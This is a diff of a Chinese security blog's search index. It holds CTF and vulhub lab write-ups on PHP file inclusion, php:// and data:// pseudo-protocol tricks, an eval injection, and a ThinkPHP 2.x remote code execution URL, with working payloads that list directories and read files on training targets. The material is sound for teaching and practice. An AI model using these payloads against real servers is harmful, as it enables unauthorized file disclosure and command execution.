+<h1 id="例题：攻防世界-Web-php-include"><a href="#例题：攻防世界-Web-php-include" class="headerlink" title="例题：攻防世界-Web_php_include"></a>例题：攻防世界-Web_php_include</h1><p>打开网页，看到一段 PHP 代码如下，观察到这段代码有 include() 函数，因此这题要考虑文件包含漏洞。<strong>strstr() 函数</strong>查找字符串首次出现的位置，然后返回字符串剩余部分。注意到这段代码使用了 strstr() 函数将传入参数中的 “php:&#x2F;&#x2F;” 全部删了，也就是说此处无法直接使用 PHP 伪协议来完成。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意到这里还传递了一个参数 “hello”，我们尝试传一个参数进去，发现这个参数被回显回了网页。因此我们考虑以命令执行，然后命令执行的结果回显到浏览器，例如用 ls、cat 命令来查看。<br><img src="https://images.gaifagafin.top/202311051150500.png"><br>这里可以改用 data 伪协议来做，首先我们还是要先知道 flag 放在哪里，写出如下代码，则网页就会执行 ls 命令输出目录下的文件名。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>根据 data 伪协议的使用方法，我们需要把上述代码用 base64 编码然后传入：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?page=data:<span class="hljs-comment">//text/plain/;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://images.gaifagafin.top/202311051150138.png"><br>接下来就要查看 “fl4gisisish3r3.php” 这个文件的内容了，还是一样写出下面代码让网页执行 cat 命令查看文件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>还是一样把上述代码用 base64 编码然后传入，然后打开 F12 查看源码就能看到 flag。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?page=data:<span class="hljs-comment">//text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQiKT8+</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<p>文章摘自：<a href="https://www.cnblogs.com/linfangnan/p/13535097.html">https://www.cnblogs.com/linfangnan/p/13535097.html</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>CTF_Basics</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
+        <tag>伪协议</tag>
       </tags>
   </entry>
   <entry>
@@ -793,132 +1225,6 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP伪协议</title>
-    <url>/2023/10/31/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。但是这也产生了<strong>文件包含漏洞</strong>，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。</p>
-<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>include()</td>
-<td>代码执行到 include() 函数时将文件包含</td>
-</tr>
-<tr>
-<td>include_once()</td>
-<td>当重复调用同一文件时只调用一次,功能与 include() 相同</td>
-</tr>
-<tr>
-<td>require()</td>
-<td>require() 执行如果发生错误，函数会报错并终止脚本</td>
-</tr>
-<tr>
-<td>require_once()</td>
-<td>当重复调用同一文件时只调用一次,功能与 require() 相同</td>
-</tr>
-</tbody></table>
-<h2 id="包含漏洞分类"><a href="#包含漏洞分类" class="headerlink" title="包含漏洞分类"></a>包含漏洞分类</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>当包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容不符合 php 语法，会直接将文件内容输出。例如下面这段简易的代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀不能与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini">Copy <span class="hljs-attr">Highlighter-hljsallow_url_include</span> = <span class="hljs-literal">on</span>（是否允许 include/require 远程文件）<br><span class="hljs-attr">allow_url_fopen</span> = <span class="hljs-literal">on</span>（是否允许打开远程文件）<br></code></pre></td></tr></table></figure>
-
-<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h2><p><strong>PHP 伪协议</strong>是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p>
-<table>
-<thead>
-<tr>
-<th>伪协议</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>file:&#x2F;&#x2F;</td>
-<td>访问本地文件系统</td>
-</tr>
-<tr>
-<td>http:&#x2F;&#x2F;</td>
-<td>访问 HTTP(s) 网址</td>
-</tr>
-<tr>
-<td>php:&#x2F;&#x2F;</td>
-<td>访问各个输入&#x2F;输出流</td>
-</tr>
-<tr>
-<td>phar:&#x2F;&#x2F;</td>
-<td>PHP 归档</td>
-</tr>
-<tr>
-<td>zip:&#x2F;&#x2F;</td>
-<td>压缩流</td>
-</tr>
-</tbody></table>
-<p>例如在 allow_url_include &#x3D; on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">?file=php://filter/read=convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure>
-
-<p>稍微解释下这个做法，<strong>php:&#x2F;&#x2F;filter&#x2F;</strong> 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。<br>php 协议还常用 <strong>php:&#x2F;&#x2F;input</strong>，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p>
-<h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>假设一个测试页面该页面存在文件包含漏洞，且网站内部有密码的备份文件，尝试获取密码。在 index.php 页面下有个 file 参数用于接收要包含的文件，设置之为 php:&#x2F;&#x2F;input 伪协议，用 post 传递要执行的 php 代码。系统执行 ls 命令遍历目录，看到当前目录下有 2 个 php 文件。<br><img src="https://images.gaifagafin.top/202311051147768.png"><br>显然密码文件不在这里，执行 pwd 命令查看当前的目录，看到这里距离站点根目录还有好几层。<br><img src="https://images.gaifagafin.top/202311051147341.png"><br>使用“ls ..”遍历上一级目录，看到一张图片和 2 个网站的目录。<br><img src="https://images.gaifagafin.top/202311051147439.png"><br>使用“ls ..&#x2F;..”遍历上一级的上一级目录，看到文件“mima”，此地无银三百两。<br><img src="https://images.gaifagafin.top/202311051147878.png"><br>使用 php:&#x2F;&#x2F;filter 伪协议查看该文件，base64 解码后得到想要的东西。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=../../mima</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://images.gaifagafin.top/202311051148657.png"><br><img src="https://images.gaifagafin.top/202311051148548.png"></p>
-<h2 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h2><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain;base64,xxxx(base64编码后的数据)</span><br></code></pre></td></tr></table></figure>
-
-<h1 id="例题：bugku-本地包含"><a href="#例题：bugku-本地包含" class="headerlink" title="例题：bugku-本地包含"></a>例题：bugku-本地包含</h1><p>题目的源码如下，观察到代码将提取一个 REQUEST 变量，这个变量时 HTTP Request 变量，默认情况下包含了 GET、POST 和 COOKIE 的数组。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump(<span class="hljs-subst">$a</span>);&quot;</span>);      <span class="hljs-comment">//var_dump() 函数可以输出变量的类型和值</span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>第一种解法是利用 eval() 函数，它把字符串按照 PHP 代码来计算，该字符串必须是合法的 PHP 代码且必须以分号结尾。这里 eval() 会把变量 a 中的内容提取出来，然后执行 var_dump() 函数输出。不过由于变量 a 来自于变量 hello 变量，而如果 hello 变量中的内容是代码，也会被执行。所以这里可以传入一句代码来直接显示 flag.php，例如：</p>
-<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">hello</span><span class="hljs-operator">=</span>)<span class="hljs-comment">;show_source(%27flag.php%27</span><br></code></pre></td></tr></table></figure>
-
-<p>则在 eval 中，就会把上述 hello 的值替换掉变量 a，等同于执行如下代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>();<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
-
-<p>同理，使用其他的函数显示文件也是可以的，注意使用 “);” 来构造。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">hello=);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>)<br>hello=);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>)<br>hello=);<span class="hljs-keyword">include</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]<br></code></pre></td></tr></table></figure>
-
-<p>第二种解法就是用 PHP 伪协议把 flag.php 文件读出来，然后再使用 include() 函数包含出来。<br><img src="https://images.gaifagafin.top/202311051151314.png"><br>当然还有第 3 种解法，就是直接把 flag.php 导入到 hello 变量中。</p>
-<h1 id="例题：bugku-flag-在-index-里"><a href="#例题：bugku-flag-在-index-里" class="headerlink" title="例题：bugku-flag 在 index 里"></a>例题：bugku-flag 在 index 里</h1><p>打开网页，点击后观察 url 有个文件包含漏洞，也就是说我们可以想办法把包含 flag 的文件导出来。<br><img src="https://images.gaifagafin.top/202311051149193.png"><br>根据提示 flag 在 index.php 里，使用 php 伪协议把文件内容的 base64 编码导出，解码得到 flag。<br><img src="https://images.gaifagafin.top/202311051149193.png"></p>
-<h1 id="例题：bugku-welcome-to-bugkuctf"><a href="#例题：bugku-welcome-to-bugkuctf" class="headerlink" title="例题：bugku-welcome to bugkuctf"></a>例题：bugku-welcome to bugkuctf</h1><p>打开网页查看源码如下，源码要求用 GET 方式传递三个参数，其中 user 不为空，并且作为文件名变量打开后的文件内容为 “welcome to the bugkuctf”，file 要求值为 hint.php。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!--  <br><span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;txt&quot;</span>];  <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];  <br><span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];  <br>  <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$user</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$user</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello admin!&lt;br&gt;&quot;</span>;  <br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <span class="hljs-comment">//hint.php  </span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are not admin ! &quot;</span>;  <br>&#125;  <br> --&gt;  <br></code></pre></td></tr></table></figure>
-
-<p>对于变量 user，当传进去的变量的参数作为文件名变量去打开时，可用 php:&#x2F;&#x2F;input 作为参数，同时使用 post 方式传入内容作为变量的文件内容。对于 file 变量，可以使用伪协议 php:&#x2F;&#x2F;filter 来读取 hint.php 文件。构造出的 payload 为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">index.php?txt=php:<span class="hljs-comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php&amp;password=</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://images.gaifagafin.top/202311051149941.png"><br>此时就得到了 hint.php 的源码的 base64 编码，解码后得到：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;good&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>接下来的内容关于 PHP 反序列化，可以前往博客<a href="https://www.cnblogs.com/linfangnan/p/13520608.html">CTF-WEB：PHP 反序列化</a>查看剩余步骤。</p>
-<h1 id="例题：攻防世界-Web-php-include"><a href="#例题：攻防世界-Web-php-include" class="headerlink" title="例题：攻防世界-Web_php_include"></a>例题：攻防世界-Web_php_include</h1><p>打开网页，看到一段 PHP 代码如下，观察到这段代码有 include() 函数，因此这题要考虑文件包含漏洞。<strong>strstr() 函数</strong>查找字符串首次出现的位置，然后返回字符串剩余部分。注意到这段代码使用了 strstr() 函数将传入参数中的 “php:&#x2F;&#x2F;” 全部删了，也就是说此处无法直接使用 PHP 伪协议来完成。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>注意到这里还传递了一个参数 “hello”，我们尝试传一个参数进去，发现这个参数被回显回了网页。因此我们考虑以命令执行，然后命令执行的结果回显到浏览器，例如用 ls、cat 命令来查看。<br><img src="https://images.gaifagafin.top/202311051150500.png"><br>这里可以改用 data 伪协议来做，首先我们还是要先知道 flag 放在哪里，写出如下代码，则网页就会执行 ls 命令输出目录下的文件名。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>根据 data 伪协议的使用方法，我们需要把上述代码用 base64 编码然后传入：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?page=data:<span class="hljs-comment">//text/plain/;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://images.gaifagafin.top/202311051150138.png"><br>接下来就要查看 “fl4gisisish3r3.php” 这个文件的内容了，还是一样写出下面代码让网页执行 cat 命令查看文件。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>还是一样把上述代码用 base64 编码然后传入，然后打开 F12 查看源码就能看到 flag。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?page=data:<span class="hljs-comment">//text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQiKT8+</span><br></code></pre></td></tr></table></figure>
-
-<hr>
-<p>文章摘自：<a href="https://www.cnblogs.com/linfangnan/p/13535097.html">https://www.cnblogs.com/linfangnan/p/13535097.html</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Basics</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PHP</tag>
-        <tag>伪协议</tag>
       </tags>
   </entry>
   <entry>
@@ -1451,41 +1757,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ThinkPHP 2.x 任意代码执行漏洞</title>
-    <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
-<ol>
-<li>复现环境中的代码执行漏洞，截图证明</li>
-<li>尝试利用代码执行漏洞读取服务器Web目录下的文件列表，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/thinkphp/2-rce</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器，这里我将虚拟机5006端口映射到容器80端口，浏览器访问5006端口</p>
-<img src="https://images.gaifagafin.top/202311112126159.png" style="zoom:67%;" />
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code></p>
-<p>即可执行<code>phpinfo()</code></p>
-<img src="https://images.gaifagafin.top/202311112126268.png" style="zoom:67%;" />
-
-<h2 id="读取服务器Web目录下的文件列表"><a href="#读取服务器Web目录下的文件列表" class="headerlink" title="读取服务器Web目录下的文件列表"></a>读取服务器Web目录下的文件列表</h2><p>根据上面漏洞复现，要想读取文件列表，首先想到system()函数，于是构造<code>http://192.168.52.130:5006/index.php?s=%2findex%2findex%2fname%2f$%7B@system(%22ls%22)%7D</code></p>
-<p>但是这里单引号双引号都被过滤了</p>
-<img src="https://images.gaifagafin.top/202311112126372.png" style="zoom:67%;" />
-
-<p>这是时想到PHP还有<code>var_dump()</code>函数，并且反引号似乎不会被过滤，于是构造payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://192.168.52.130:5006/index.php?s=/index/index/name/$%7B@var_dump(%60ls%60)%7D%20<br></code></pre></td></tr></table></figure>
-
-<p>得到文件列表</p>
-<p><img src="https://images.gaifagafin.top/202311112126522.png"></p>
-<p>进入容器验证</p>
-<img src="https://images.gaifagafin.top/202311112126245.png" style="zoom: 80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Weblogic 任意文件上传漏洞（CVE-2018-2894）</title>
     <url>/2023/11/11/Weblogic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89/</url>
     <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Weblogic 任意文件上传漏洞（CVE-2018-2894）</strong></p>
@@ -1536,9 +1807,44 @@
       </tags>
   </entry>
   <entry>
+    <title>ThinkPHP 2.x 任意代码执行漏洞</title>
+    <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
+<ol>
+<li>复现环境中的代码执行漏洞，截图证明</li>
+<li>尝试利用代码执行漏洞读取服务器Web目录下的文件列表，提供截图</li>
+</ol>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/thinkphp/2-rce</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器，这里我将虚拟机5006端口映射到容器80端口，浏览器访问5006端口</p>
+<img src="https://images.gaifagafin.top/202311112126159.png" style="zoom:67%;" />
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code></p>
+<p>即可执行<code>phpinfo()</code></p>
+<img src="https://images.gaifagafin.top/202311112126268.png" style="zoom:67%;" />
+
+<h2 id="读取服务器Web目录下的文件列表"><a href="#读取服务器Web目录下的文件列表" class="headerlink" title="读取服务器Web目录下的文件列表"></a>读取服务器Web目录下的文件列表</h2><p>根据上面漏洞复现，要想读取文件列表，首先想到system()函数，于是构造<code>http://192.168.52.130:5006/index.php?s=%2findex%2findex%2fname%2f$%7B@system(%22ls%22)%7D</code></p>
+<p>但是这里单引号双引号都被过滤了</p>
+<img src="https://images.gaifagafin.top/202311112126372.png" style="zoom:67%;" />
+
+<p>这是时想到PHP还有<code>var_dump()</code>函数，并且反引号似乎不会被过滤，于是构造payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://192.168.52.130:5006/index.php?s=/index/index/name/$%7B@var_dump(%60ls%60)%7D%20<br></code></pre></td></tr></table></figure>
+
+<p>得到文件列表</p>
+<p><img src="https://images.gaifagafin.top/202311112126522.png"></p>
+<p>进入容器验证</p>
+<img src="https://images.gaifagafin.top/202311112126245.png" style="zoom: 80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ecShop漏洞复现</title>
     <url>/2023/11/08/ecShop%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="ecShop漏洞复现"><a href="#ecShop漏洞复现" class="headerlink" title="ecShop漏洞复现"></a>ecShop漏洞复现</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>进入漏洞文件目录，输入<code>docker-compose up -d </code></p>
+    <content><![CDATA[<h1 id="ecShop漏洞复现-2-X-3-X-4-X"><a href="#ecShop漏洞复现-2-X-3-X-4-X" class="headerlink" title="ecShop漏洞复现(2.X,3.X,4.X)"></a>ecShop漏洞复现(2.X,3.X,4.X)</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>进入漏洞文件目录，输入<code>docker-compose up -d </code></p>
 <p>启动docker容器</p>
 <img src="https://images.gaifagafin.top/202311082306552.png" style="zoom: 80%;" />
 
@@ -1608,23 +1914,6 @@
       <tags>
         <tag>vulhub</tag>
         <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于建站</title>
-    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
-    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
-<p>免费的但不完全免费的聚合图床，路过图床，ImgUrl，SM.MS…</p>
-<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
-<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
-<p>最终还是选用cloudflare R2，因为它对于浏览量不高的个人博主来说确实是纯纯白嫖了</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>建站</tag>
-        <tag>图床</tag>
       </tags>
   </entry>
   <entry>
@@ -1831,6 +2120,23 @@
       </tags>
   </entry>
   <entry>
+    <title>关于建站</title>
+    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
+    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
+<p>免费的但不完全免费的聚合图床，路过图床，ImgUrl，SM.MS…</p>
+<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
+<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
+<p>最终还是选用cloudflare R2，因为它对于浏览量不高的个人博主来说确实是纯纯白嫖了</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>建站</tag>
+        <tag>图床</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>图床图片测试</title>
     <url>/2023/10/29/%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<p><img src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
@@ -1904,6 +2210,56 @@
       <tags>
         <tag>CTF</tag>
         <tag>攻防世界</tag>
+      </tags>
